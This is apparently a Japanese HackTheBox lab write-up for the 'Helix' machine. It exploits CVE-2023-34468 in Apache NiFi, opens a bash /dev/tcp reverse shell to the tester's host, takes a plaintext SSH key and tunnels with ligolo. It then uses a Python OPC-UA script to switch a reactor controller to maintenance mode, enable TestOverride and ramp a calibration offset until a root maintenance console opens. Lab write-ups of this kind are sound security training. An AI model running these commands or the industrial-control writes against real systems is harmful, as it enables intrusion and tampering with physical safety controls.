🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Helix: HackTheBox ライトアップ

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9ef7dfc0282a2ed0dfd37bc16fd15bb5.png" width="120"/>
<div>

**難易度**: Medium
**OS**: Linux
**タイプ**: ICS / ミドルウェア / OPC-UA

</div>
</div>

---

## 攻撃チェーンの概要

```
CVE-2023-34468 経由の RCE (Apache NiFi 1.21.0, ExecuteSQL + H2 JDBC)
-> nifi シェル
-> NiFi の support-bundles にある operator の SSH 鍵
-> User フラグ
-> OPC-UA の操作 (MAINTENANCE モード + TestOverride + CalibrationOffset ランプ)
-> メンテナンスウィンドウが開く -> sudo helix-maint-console
-> ROOT
```

---

## 列挙 (Enumeration)

### Nmap スキャン

```bash
nmap -sV -sC helix.htb -oN scan.txt
```

開いているポート：
- **80**：nginx（NiFi へのリバースプロキシ）

### サービスの発見

vhost `flow.helix.htb` は認証なしでアクセスできる **Apache NiFi 1.21.0** インスタンスを公開しています。
バージョンはインターフェースの *About Apache NiFi* メニューから確認できます。

---

## 初期侵入 (Foothold): CVE-2023-34468 経由の RCE

### 脆弱性

Apache NiFi 1.22.0 以下は、`ExecuteSQL` プロセッサ経由の**未認証リモートコード実行**に脆弱です。`INIT=RUNSCRIPT` を指定した悪意ある H2 JDBC URL を設定することで、サーバーに任意の SQL を実行させることができ、`EXEC` によるシステムコールも可能になります。

### koi でのエクスプロイト

まず koi でリスナーを起動し、公開されている PoC [Al3xx-sec/CVE-2023-34468-POC](https://github.com/Al3xx-sec/CVE-2023-34468-POC) を使用します：

```bash
# koi は tun0 インターフェース用のペイロードを自動生成する
b3rt1ng@koi❯ payload tun0
# -> bash: bash -c "bash -i >& /dev/tcp/10.10.16.6/4010 0>&1"

# エクスプロイト
python3 exploit.py -u http://flow.helix.htb/nifi -l 10.10.16.6 -p 4010
```

koi がシェルを受け取り、自動アップグレードを提案します：

```
▶  New session #1  10.129.223.240:54146 [ linux ]
b3rt1ng@koi(1 session) ❯ upgrade 1
  ✔  Shell #1 upgraded successfully.
b3rt1ng@koi(1 session) ❯ go 1
nifi@helix:/opt/nifi-1.21.0$
```

---

## ポストエクスプロイテーション列挙 (nifi)

### koi によるシステム情報

```
b3rt1ng@koi(1 session) ❯ run sysinfo 1
╭──────────────────────── System Info : #1 ────────────────────────╮
│  hostname  : helix                                               │
│  OS        : Ubuntu 22.04.5 LTS                                  │
│  arch      : x86_64                                               │
│  user      : uid=998(nifi) gid=998(nifi)                         │
│  IP        : 10.129.223.240                                      │
╰──────────────────────────────────────────────────────────────────╯

b3rt1ng@koi(1 session) ❯ run env_dump 1
# 環境変数に機密情報はなし。

b3rt1ng@koi(1 session) ❯ run memorybleed 1
# メモリ内に認証情報なし。
```

### 内部ポート

```bash
# nifi シェル内で
ss -tlnp
```

発見された内部ポート：
- **4840**：OPC-UA (`opc.tcp://127.0.0.1:4840/helix/`)
- **8081**：Helix HMI (Werkzeug/Python)

ポート 8081 の HMI は産業用リアクター制御パネルを公開しています：

```bash
curl -s http://127.0.0.1:8081/
# -> Helix Industries: Reactor HMI
# -> Temperature: 284.0°C | Pressure: 69.00 bar
# -> Maintenance Window: CLOSED
# -> OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/
```

### operator の SSH 鍵

```bash
find /opt/nifi-1.21.0 -name "*.bak" 2>/dev/null
# -> /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak

cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
# -> -----BEGIN OPENSSH PRIVATE KEY-----
```

NiFi の support-bundles 内に、平文の ed25519 秘密鍵が保存されています。

---

## User フラグ

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb
cat ~/user.txt
```

## 権限昇格

### 列挙

```bash
sudo -l
```

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

`helix-maint-console` の実行には **Maintenance Window** が開いている必要があります。これは PLC が OPC-UA 経由で制御しています。

### operator のドキュメントを取得

koi の `download` モジュールを使って operator のホームディレクトリからファイルを取得します。ファイル名にスペースが含まれるため、事前にターゲット側でリネームが必要です：

```bash
# ターゲット側で
cp ~/control\ systems\ diagram.png /tmp/diagram.png
cp ~/Operator\ Control\ \&\ Safety\ Guide.pdf /tmp/guide.pdf
```

```
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/diagram.png
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/guide.pdf
```

PDF はパスワード `operator 1` で保護されています（john + rockyou でクラック）。復号します：

```bash
python3 -c "
import pikepdf
pdf = pikepdf.open('guide.pdf', password='operator 1')
pdf.save('guide_unlocked.pdf')
"
```

図と PDF にはシステムのロジックが記載されています：

> Maintenance Window は、安全トリップ（305°C / 75 bar）を発生させることなく **Temp >= 295°C または Pressure >= 73 bar** になり、かつ **MAINTENANCE モード**で **TestOverride が有効**な場合にのみ開きます。

### koi + ligolo で OPC-UA へトンネル

ポート 4840 はターゲット上でループバックのみアクセス可能です。koi の ligolo モジュールでエージェントを自動アップロードします：

```
b3rt1ng@koi(1 session) ❯ run ligolo 1
  ✔  Agent uploaded to /tmp/agent
```

```bash
# Kali 側で ligolo プロキシを起動
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# ターゲット側で
/tmp/agent -connect 10.10.16.6:11601 -ignore-cert
```

```
# ligolo コンソール内で
ligolo-ng » session
[Agent : nifi@helix] » start

# 240.0.0.1 はリモートエージェントの 127.0.0.1 に対する ligolo のエイリアス
sudo ip route add 240.0.0.1/32 dev ligolo
```

### OPC-UA ノードの発見

```bash
pip3 install asyncua --break-system-packages

python3 << 'EOF'
from asyncua.sync import Client
from asyncua import ua

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

for i in range(1, 100):
    try:
        node = c.get_node(ua.NodeId(i, 2))
        name = node.read_browse_name()
        val  = node.read_value()
        print(f"ns=2;i={i} | {name.Name} = {val}")
    except:
        pass

c.disconnect()
EOF
```

```
ns=2;i=3  | TemperatureRaw     = 283.97
ns=2;i=4  | Temperature        = 283.97
ns=2;i=5  | Pressure           = 68.99
ns=2;i=6  | CalibrationOffset  = 0.0
ns=2;i=8  | RodsInserted       = False
ns=2;i=9  | EmergencyCooling   = False
ns=2;i=10 | TripActive         = False
ns=2;i=12 | Mode               = NORMAL
ns=2;i=13 | TestOverride       = False
ns=2;i=14 | ResetTrip          = False
```

書き込み可能なノードを特定：

| NodeId    | 名前              | アクセス   |
|-----------|-------------------|-----------|
| ns=2;i=6  | CalibrationOffset | 書き込み可 |
| ns=2;i=12 | Mode              | 書き込み可 |
| ns=2;i=13 | TestOverride      | 書き込み可 |
| ns=2;i=14 | ResetTrip         | 書き込み可 |

### OPC-UA の操作：Maintenance Window を開く

PDF によると、操作の順序が重要です：
1. `MAINTENANCE` モードに切り替える
2. `TestOverride` を有効にする
3. `CalibrationOffset` を段階的に上げる。急激すぎるランプは安全トリップ（305°C 以上）を発生させるため

```python
from asyncua.sync import Client
from asyncua import ua
import time

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

# Step 1: MAINTENANCE モード
mode = c.get_node(ua.NodeId(12, 2))
mode.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
print(f"[+] Mode: {mode.read_value()}")

# Step 2: TestOverride = True
override = c.get_node(ua.NodeId(13, 2))
override.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
print(f"[+] TestOverride: {override.read_value()}")

# Step 3: CalibrationOffset を 12.0 までランプ (Temp ~ 296°C)
offset = c.get_node(ua.NodeId(6, 2))
for val in [3.0, 6.0, 9.0, 12.0]:
    offset.write_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
    temp = c.get_node(ua.NodeId(4, 2)).read_value()
    print(f"[+] Offset={val} -> Temp={temp:.2f}°C")
    time.sleep(1)

c.disconnect()
```

```
[+] Mode: MAINTENANCE
[+] TestOverride: True
[+] Offset=3.0  -> Temp=287.06°C
[+] Offset=6.0  -> Temp=290.13°C
[+] Offset=9.0  -> Temp=293.18°C
[+] Offset=12.0 -> Temp=296.22°C
```

### Root シェル

Maintenance Window が開いたら、すぐに `helix-maint-console` を起動します（時間制限のあるウィンドウです）：

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 113 seconds
root@helix:~#
```

---

## Root フラグ

```bash
cat /root/root.txt
```
